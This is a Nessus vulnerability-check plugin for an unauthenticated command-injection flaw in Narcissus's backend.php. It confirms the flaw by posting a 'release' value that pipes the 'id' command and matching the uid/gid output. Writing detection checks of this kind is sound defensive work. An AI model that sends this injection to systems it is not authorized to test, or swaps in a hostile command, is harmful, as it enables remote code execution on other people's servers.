#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(63111);
  script_version("$Revision: 1.4 $");
  script_cvs_date("$Date: 2014/03/05 23:13:28 $");

  script_bugtraq_id(56511);
  script_osvdb_id(87410);
  script_xref(name:"EDB-ID", value:"22709");

  script_name(english:"Narcissus backend.php release Parameter Remote Command Execution");
  script_summary(english:"Tries to run a command using Narcissus");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a PHP script that allows arbitrary command
execution.");
  script_set_attribute(attribute:"description", value:
"The remote web server hosts Narcissus, an online tool for the Angstrom
distribution, used to create 'rootfs' images for embedded devices. 

The version of Narcissus hosted on the remote web server fails to
properly sanitize user-supplied input in a POST request to the 'release'
parameter of the 'backend.php' script, when 'action' is set to
'configure_image', before using it in a call to PHP's 'passthru()'
function.  An unauthenticated, remote attacker can leverage this issue
to execute arbitrary code on the remote host subject to the privileges
of the web server user.");
  # https://github.com/Angstrom-distribution/narcissus/commit/3921ea72bc87fb073219137654b1bd47ede11555
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?7a08415b");
  script_set_attribute(attribute:"solution", value:"Apply the vendor-supplied patch from the referenced URL.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Narcissus RCE");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Narcissus Image Configuration Passthru Vulnerability');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/11/14");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/11/15");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/11/30");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"x-cpe:/a:angstrom:narcissus");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2012-2014 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80, php:TRUE);

if (thorough_tests) dirs = list_uniq(make_list("/narcissus", cgi_dirs()));
else dirs = make_list(cgi_dirs());

cmd = "id";
cmd_pat = "uid=[0-9]+.*gid=[0-9]+.*";

non_vuln = make_list();
found = FALSE;

foreach dir (dirs)
{
  res = http_send_recv3(
    method       : "GET",
    item         : dir + "/index.html",
    port         : port,
    exit_on_fail : TRUE
  );

  if (
      !isnull(res[2]) &&
      '<h1>Narcissus</h1>' >< res[2] && 
      (
        'href="http://git.angstrom-distribution.org/cgi-bin/cgit.cgi/narcissus' >< res[2] || 
        'href="http://gitorious.org/angstrom/narcissus' >< res[2]
      )
  )
  {
    found = TRUE;

    res2 = http_send_recv3(
      port         : port,
      method       : "POST",
      item         : dir + "/backend.php",
      data         : "machine=0&action=configure_image&release=|"+cmd,
      add_headers  : make_array("Content-Type",
        "application/x-www-form-urlencoded"),
      exit_on_fail : TRUE
    );
    if (isnull(res[2])) continue;

    exploited = egrep(pattern:cmd_pat, string:res2[2]);

    if (exploited)
    {

      output = strstr(res2[2], exploited);
      snip = crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);

      if (report_verbosity > 0)
      {
        report =
          '\n' + "Nessus was able execute the command 'id' on the remote host"+
	  '\n' + "using the following request :" +
          '\n' +
          '\n' + snip +
          '\n' + http_last_sent_request() +
          '\n' + snip +
          '\n';
        if (report_verbosity > 1)
        {
          report +=
            '\n' + 'This produced the following output :' +
            '\n' + 
            '\n' + snip +
            '\n' + chomp(output) +
            '\n' + snip +
            '\n';
        }
	security_hole(port:port, extra:report);
      }
      else security_hole(port);
    }
    else non_vuln = make_list(non_vuln, build_url(qs:dir+"/", port:port)); 

    if (!thorough_tests) break;
  }
}

# Audit Trails
if (!found) audit(AUDIT_WEB_APP_NOT_INST, "Narcissus", port);

installs = max_index(non_vuln);
if (installs > 0)
{
  if (installs == 1) audit(AUDIT_WEB_APP_NOT_AFFECTED, "Narcissus", non_vuln[0]);
  else exit(0, "The Narcissus installs at " + join(non_vuln, sep:", ") + " are not affected.");
}
